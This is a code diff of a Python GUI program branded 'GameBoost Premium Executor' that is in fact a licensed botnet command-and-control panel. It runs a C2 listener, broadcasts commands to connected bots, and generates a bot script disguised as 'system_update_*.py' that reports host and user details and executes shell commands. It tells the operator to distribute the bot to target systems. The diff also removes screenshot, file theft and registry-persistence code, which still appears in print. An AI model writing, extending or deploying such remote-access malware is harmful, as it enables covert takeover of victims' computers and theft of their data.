@@ -9,7 +9,7 @@ import os
 from datetime import datetime
 
 LICENSE_KEY = "{{LICENSE_KEY}}"
-OWNER_HOST = "localhost"
+OWNER_HOST = "localhost"  # Change to owner server IP if remote
 OWNER_PORT = 9999
 
 class BuyerClient:
@@ -18,83 +18,113 @@ class BuyerClient:
         self.bots = {}
         self.c2_port = random.randint(10000, 60000)
         self.server = None
-        self.connected = False
+        self.connected_to_owner = False
         self.setup_gui()
         
     def connect_to_owner(self):
+        """Connect to owner server and activate license"""
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(10)  # 10 second timeout
             sock.connect((OWNER_HOST, OWNER_PORT))
-            msg = {'type': 'register', 'license_key': self.license_key}
-            sock.send(json.dumps(msg).encode())
-            response = json.loads(sock.recv(1024).decode())
+            
+            # Send registration message
+            register_msg = {
+                'type': 'register',
+                'license_key': self.license_key
+            }
+            sock.send(json.dumps(register_msg).encode())
+            
+            # Get response
+            response_data = sock.recv(1024).decode()
+            response = json.loads(response_data)
             sock.close()
+            
             if response.get('status') == 'success':
-                self.connected = True
+                self.connected_to_owner = True
                 return True
+            else:
+                self.log_message(f"Owner server rejected license: {response.get('message', 'Unknown error')}")
+                return False
+                
+        except socket.timeout:
+            self.log_message("❌ Connection timeout - owner server not responding")
+            return False
+        except ConnectionRefusedError:
+            self.log_message("❌ Connection refused - owner server not running")
             return False
         except Exception as e:
-            print(f"Connection error: {e}")
+            self.log_message(f"❌ Connection error: {e}")
             return False
             
     def start_c2_server(self):
-        def handle_client(conn, addr):
+        """Start local C2 server for bots to connect to"""
+        def handle_bot_connection(conn, addr):
             try:
                 data = conn.recv(1024).decode()
-                info = json.loads(data)
-                bot_id = info.get('bot_id', 'unknown')
+                bot_info = json.loads(data)
+                bot_id = bot_info.get('bot_id', 'unknown')
+                
                 self.bots[bot_id] = {
                     'conn': conn, 
-                    'info': info, 
+                    'info': bot_info, 
                     'addr': addr, 
                     'last_seen': datetime.now()
                 }
+                
                 self.update_display()
+                self.log_message(f"✅ Bot connected: {bot_id}")
                 
                 # Notify owner server about new bot
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.connect((OWNER_HOST, OWNER_PORT))
-                    notify_msg = {
-                        'type': 'bot_connected',
-                        'bot_id': bot_id,
-                        'buyer_key': self.license_key,
-                        'system_info': info.get('system_info', {})
-                    }
-                    sock.send(json.dumps(notify_msg).encode())
-                    sock.close()
-                except Exception as e:
-                    print(f"Failed to notify owner: {e}")
-                    
+                if self.connected_to_owner:
+                    try:
+                        owner_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        owner_sock.settimeout(5)
+                        owner_sock.connect((OWNER_HOST, OWNER_PORT))
+                        notify_msg = {
+                            'type': 'bot_connected',
+                            'bot_id': bot_id,
+                            'buyer_key': self.license_key,
+                            'system_info': bot_info.get('system_info', {})
+                        }
+                        owner_sock.send(json.dumps(notify_msg).encode())
+                        owner_sock.close()
+                        self.log_message(f"✅ Notified owner about bot: {bot_id}")
+                    except Exception as e:
+                        self.log_message(f"⚠️ Failed to notify owner: {e}")
+                        
             except Exception as e:
-                print(f"Error handling bot: {e}")
+                self.log_message(f"❌ Error handling bot: {e}")
                 
         def server_loop():
             self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.server.bind(('0.0.0.0', self.c2_port))
             self.server.listen(5)
+            self.log_message(f"🔄 C2 server listening on port {self.c2_port}")
+            
             while True:
                 try:
                     conn, addr = self.server.accept()
-                    threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
+                    threading.Thread(target=handle_bot_connection, args=(conn, addr), daemon=True).start()
                 except:
-                    break
+                    break  # Server stopped
                     
         threading.Thread(target=server_loop, daemon=True).start()
         return True
         
     def create_bot_file(self):
-        # Get local IP for bot connection
+        """Create bot file that connects to this buyer's C2 server"""
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect(("8.8.8.8", 80))
-            local_ip = s.getsockname()[0]
-            s.close()
-        except:
-            local_ip = "127.0.0.1"
-        
-        # Create bot file with buyer IP (NO LICENSE KEY NEEDED)
-        bot_code = f"""import socket
+            # Get local IP for bot connection
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.connect(("8.8.8.8", 80))
+                local_ip = s.getsockname()[0]
+                s.close()
+            except:
+                local_ip = "127.0.0.1"
+            
+            bot_code = f'''import socket
 import json
 import platform
 import os
@@ -103,8 +133,6 @@ import time
 import random
 import ctypes
 import sys
-import base64
-from datetime import datetime
 
 def is_admin():
     try:
@@ -127,9 +155,7 @@ def get_system_info():
         "hostname": platform.node(), 
         "username": os.getenv("USERNAME", "unknown"),
         "architecture": platform.architecture()[0],
-        "admin_access": "Full",
-        "network_access": "Full",
-        "timestamp": datetime.now().isoformat()
+        "admin_access": "Full"
     }}
 
 def execute_command(command):
@@ -139,50 +165,8 @@ def execute_command(command):
             output = result.stdout + result.stderr
         elif command == "sysinfo":
             output = json.dumps(get_system_info(), indent=2)
-        elif command == "screenshot":
-            try:
-                import pyautogui
-                screenshot = pyautogui.screenshot()
-                import io
-                img_bytes = io.BytesIO()
-                screenshot.save(img_bytes, format='PNG')
-                output = base64.b64encode(img_bytes.getvalue()).decode()
-            except:
-                output = "Screenshot failed"
-        elif command.startswith("download:"):
-            filepath = command[9:]
-            try:
-                with open(filepath, 'rb') as f:
-                    output = base64.b64encode(f.read()).decode()
-            except Exception as e:
-                output = f"Download failed: {{str(e)}}"
-        elif command.startswith("upload:"):
-            parts = command[7:].split(":", 1)
-            if len(parts) == 2:
-                filename, filedata = parts
-                try:
-                    with open(filename, 'wb') as f:
-                        f.write(base64.b64decode(filedata))
-                    output = f"Uploaded {{filename}}"
-                except Exception as e:
-                    output = f"Upload failed: {{str(e)}}"
-            else:
-                output = "Invalid upload command"
-        elif command == "persistence":
-            try:
-                if platform.system() == "Windows":
-                    import winreg
-                    key = winreg.HKEY_CURRENT_USER
-                    subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-                    with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
-                        winreg.SetValueEx(reg_key, "SystemUpdate", 0, winreg.REG_SZ, sys.executable)
-                    output = "Persistence added to Windows startup"
-                else:
-                    output = "Persistence only supported on Windows"
-            except Exception as e:
-                output = f"Persistence failed: {{str(e)}}"
         else:
-            output = f"Command executed: {{command}}"
+            output = f"Unknown command: {{command}}"
     except Exception as e:
         output = f"Error: {{str(e)}}"
     return output
@@ -198,9 +182,7 @@ def connect_to_buyer():
             
             connect_msg = {{
                 "bot_id": bot_id,
-                "system_info": get_system_info(),
-                "status": "connected",
-                "timestamp": datetime.now().isoformat()
+                "system_info": get_system_info()
             }}
             
             sock.send(json.dumps(connect_msg).encode())
@@ -217,13 +199,20 @@ def connect_to_buyer():
 
 if __name__ == "__main__":
     connect_to_buyer()
-"""
-        filename = f"system_update_{random.randint(1000,9999)}.py"
-        with open(filename, "w", encoding='utf-8') as f:
-            f.write(bot_code)
-        return filename
+'''
+            filename = f"system_update_{random.randint(1000,9999)}.py"
+            with open(filename, "w", encoding='utf-8') as f:
+                f.write(bot_code)
+                
+            self.log_message(f"✅ Bot file created: {filename}")
+            return filename
+            
+        except Exception as e:
+            self.log_message(f"❌ Error creating bot file: {e}")
+            return None
         
     def setup_gui(self):
+        """Setup the buyer panel GUI"""
         self.root = tk.Tk()
         self.root.title("GameBoost Premium Executor")
         self.root.geometry("1000x700")
@@ -236,7 +225,7 @@ if __name__ == "__main__":
         tk.Label(header, text="GAMEBOOST PREMIUM EXECUTOR", 
                 bg='#1e1e1e', fg='white', font=('Arial', 16, 'bold')).pack(side='left')
         
-        self.status_label = tk.Label(header, text="Status: Ready", bg='#1e1e1e', fg='white')
+        self.status_label = tk.Label(header, text="Status: Not Activated", bg='#1e1e1e', fg='red')
         self.status_label.pack(side='right')
         
         # Main content
@@ -251,21 +240,36 @@ if __name__ == "__main__":
         license_frame = tk.LabelFrame(left, text="License Information", bg='#1e1e1e', fg='white')
         license_frame.pack(fill='x', pady=(0, 10))
         
-        tk.Label(license_frame, text=f"License: {LICENSE_KEY}", bg='#1e1e1e', fg='#00ff00', 
-                font=('Courier', 10), wraplength=200).pack(pady=10)
+        tk.Label(license_frame, text="License Key:", bg='#1e1e1e', fg='white', font=('Arial', 10, 'bold')).pack(anchor='w')
+        license_display = tk.Label(license_frame, text=self.license_key, bg='#2d2d30', fg='#00ff00', 
+                                  font=('Courier', 10), wraplength=200, justify='left', padx=5, pady=5)
+        license_display.pack(fill='x', pady=5)
+        
+        tk.Button(license_frame, text="🔑 Activate License", command=self.activate_license,
+                 bg='#3498db', fg='white', font=('Arial', 10, 'bold')).pack(pady=5, fill='x')
         
         # Controls
         control_frame = tk.LabelFrame(left, text="C2 Controls", bg='#1e1e1e', fg='white')
         control_frame.pack(fill='x', pady=(0, 10))
         
-        tk.Button(control_frame, text="🔄 Activate License", command=self.activate_license,
-                 bg='#2d2d30', fg='white').pack(pady=5, fill='x')
-        
-        tk.Button(control_frame, text="🚀 Start C2 Server", command=self.start_c2_server,
-                 bg='#2d2d30', fg='white').pack(pady=5, fill='x')
+        tk.Button(control_frame, text="🚀 Start C2 Server", command=self.start_server,
+                 bg='#27ae60', fg='white', font=('Arial', 10)).pack(pady=5, fill='x')
         
         tk.Button(control_frame, text="🤖 Generate Bot", command=self.generate_bot,
-                 bg='#2d2d30', fg='white').pack(pady=5, fill='x')
+                 bg='#e74c3c', fg='white', font=('Arial', 10)).pack(pady=5, fill='x')
+        
+        # Stats
+        stats_frame = tk.LabelFrame(left, text="Statistics", bg='#1e1e1e', fg='white')
+        stats_frame.pack(fill='x', pady=(0, 10))
+        
+        self.bots_label = tk.Label(stats_frame, text="Connected Bots: 0", bg='#1e1e1e', fg='white')
+        self.bots_label.pack(anchor='w')
+        
+        self.port_label = tk.Label(stats_frame, text="C2 Port: Not running", bg='#1e1e1e', fg='white')
+        self.port_label.pack(anchor='w')
+        
+        self.license_status = tk.Label(stats_frame, text="License: Not Activated", bg='#1e1e1e', fg='red')
+        self.license_status.pack(anchor='w')
         
         # Command section
         cmd_frame = tk.LabelFrame(left, text="Bot Commands", bg='#1e1e1e', fg='white')
@@ -277,17 +281,7 @@ if __name__ == "__main__":
         self.cmd_entry.insert(0, "cmd:whoami")
         
         tk.Button(cmd_frame, text="📡 Send to All Bots", command=self.send_command,
-                 bg='#2d2d30', fg='white').pack(pady=5, fill='x')
-        
-        # Stats
-        stats_frame = tk.LabelFrame(left, text="Statistics", bg='#1e1e1e', fg='white')
-        stats_frame.pack(fill='x', pady=(0, 10))
-        
-        self.bots_label = tk.Label(stats_frame, text="Connected Bots: 0", bg='#1e1e1e', fg='white')
-        self.bots_label.pack(anchor='w')
-        
-        self.port_label = tk.Label(stats_frame, text="C2 Port: Not running", bg='#1e1e1e', fg='white')
-        self.port_label.pack(anchor='w')
+                 bg='#f39c12', fg='white').pack(pady=5, fill='x')
         
         # Right panel
         right = tk.Frame(main, bg='#1e1e1e')
@@ -326,47 +320,80 @@ if __name__ == "__main__":
         self.root.mainloop()
         
     def activate_license(self):
+        """Activate the license with owner server"""
+        self.log_message("🔄 Attempting to activate license...")
         if self.connect_to_owner():
-            self.status_label.config(text="Status: ✅ Connected", fg="green")
-            self.log_message("License activated successfully!")
+            self.status_label.config(text="Status: ✅ Activated", fg="green")
+            self.license_status.config(text="License: ✅ Activated", fg="green")
+            self.log_message("✅ License activated successfully!")
+            messagebox.showinfo("Success", "License activated successfully!\nYou can now start the C2 server.")
         else:
-            self.status_label.config(text="Status: ❌ Failed", fg="red")
-            self.log_message("License activation failed!")
+            self.status_label.config(text="Status: ❌ Activation Failed", fg="red")
+            self.license_status.config(text="License: ❌ Activation Failed", fg="red")
+            self.log_message("❌ License activation failed!")
+            messagebox.showerror("Error", "License activation failed!\n\nCheck:\n1. Owner server is running\n2. License key is valid\n3. Network connection")
             
-    def start_c2_server(self):
-        if not self.connected:
-            messagebox.showerror("Error", "Please activate license first!")
+    def start_server(self):
+        """Start the C2 server"""
+        if not self.connected_to_owner:
+            messagebox.showerror("Error", "Please activate your license first!")
             return
             
         if self.start_c2_server():
             self.status_label.config(text=f"Status: ✅ C2 Running on port {self.c2_port}")
             self.port_label.config(text=f"C2 Port: {self.c2_port}")
-            self.log_message(f"C2 server started on port {self.c2_port}")
+            self.log_message(f"✅ C2 server started on port {self.c2_port}")
+            messagebox.showinfo("Success", f"C2 server started on port {self.c2_port}\n\nYou can now generate bot files.")
+        else:
+            self.log_message("❌ Failed to start C2 server")
             
     def generate_bot(self):
-        if not hasattr(self, 'c2_port') or not self.connected:
-            messagebox.showerror("Error", "Please activate license and start C2 server first!")
+        """Generate a bot file"""
+        if not self.connected_to_owner:
+            messagebox.showerror("Error", "Please activate license first!")
+            return
+            
+        if not hasattr(self, 'c2_port'):
+            messagebox.showerror("Error", "Please start C2 server first!")
             return
             
         bot_file = self.create_bot_file()
-        self.log_message(f"Bot file created: {bot_file}")
-        messagebox.showinfo("Success", f"Bot file created: {bot_file}")
-        
-    def send_command(self):
-        command = self.cmd_entry.get().strip()
-        if command and self.bots:
-            for bot_id, bot_info in self.bots.items():
-                try:
-                    bot_info['conn'].send(command.encode())
-                    self.log_message(f"Sent command to {bot_id}: {command}")
-                except:
-                    self.log_message(f"Failed to send command to {bot_id}")
-                    del self.bots[bot_id]
-            self.update_display()
+        if bot_file:
+            messagebox.showinfo("Success", f"Bot file created: {bot_file}\n\nDistribute this file to target systems.")
         else:
-            messagebox.showwarning("Warning", "No command entered or no bots connected!")
+            messagebox.showerror("Error", "Failed to create bot file!")
+            
+    def send_command(self):
+        """Send command to all connected bots"""
+        command = self.cmd_entry.get().strip()
+        if not command:
+            messagebox.showwarning("Warning", "Please enter a command")
+            return
+            
+        if not self.bots:
+            messagebox.showwarning("Warning", "No bots connected")
+            return
+            
+        self.log_message(f"📡 Sending command to {len(self.bots)} bots: {command}")
+        disconnected_bots = []
+        
+        for bot_id, bot_info in self.bots.items():
+            try:
+                bot_info['conn'].send(command.encode())
+                self.log_message(f"✅ Command sent to {bot_id}")
+            except:
+                self.log_message(f"❌ Failed to send command to {bot_id}")
+                disconnected_bots.append(bot_id)
+        
+        # Remove disconnected bots
+        for bot_id in disconnected_bots:
+            if bot_id in self.bots:
+                del self.bots[bot_id]
+                
+        self.update_display()
             
     def update_display(self):
+        """Update the GUI display"""
         self.bots_label.config(text=f"Connected Bots: {len(self.bots)}")
         
         # Update bot tree
@@ -390,8 +417,9 @@ if __name__ == "__main__":
         self.root.after(2000, self.update_display)
         
     def log_message(self, message):
+        """Add message to log"""
         timestamp = datetime.now().strftime("%H:%M:%S")
-        self.log_text.insert(tk.END, f"[{timestamp}] {message}\\n")
+        self.log_text.insert(tk.END, f"[{timestamp}] {message}\n")
         self.log_text.see(tk.END)
 
 if __name__ == "__main__":
